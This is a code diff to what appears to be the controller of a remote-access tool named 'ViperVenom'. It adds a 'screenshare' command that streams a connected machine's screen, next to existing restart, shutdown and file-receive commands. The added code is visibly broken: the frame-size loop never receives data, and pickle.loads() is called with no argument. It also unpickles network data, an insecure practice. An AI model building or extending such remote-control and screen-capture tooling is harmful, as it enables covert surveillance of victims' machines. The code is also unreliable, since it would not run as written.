@@ -153,12 +153,30 @@ def Listener():
                                                 l = conn.recv(1024)
                                                 if not l: break
                                                 f.write(l)
-                                                time.sleep(60)
-                                                break
                                     elif Handler == "restart":
                                         conn.send(Handler.encode("utf-8"))
                                     elif Handler == "shutdown":
                                         conn.send(Handler.encode("utf-8"))
+                                    elif Handler == "screenshare":
+                                        conn.send(Handler.encode("utf-8"))
+                                        data = b""
+                                        payload_size = struct.calcsize("Q")
+                                        while True:
+                                            while len(data) < payload_size:
+                                                packed_msg_size = data[:payload_size]
+                                                data = data[payload_size:]
+                                                msg_size = struct.unpack("Q", packed_msg_size) [0]
+
+                                            while len(data) < msg_size:
+                                                data += conn.recv(4*BUFFER_SIZE)
+                                                frame_data = data [:msg_size]
+                                                data = data[msg_size:]
+                                                frame = pickle.loads()
+                                                cv2.imshow("ViperVenom", frame)
+                                                key = cv2.waitKey(1) & 0xFF
+                                                if key == ord('q'):
+                                                    break
+
 
 
 
@@ -333,5 +351,3 @@ else:
     print(colored("[*] ERROR Invaild Argument, Exiting...", "red"))
     while True:
         break
-
-        
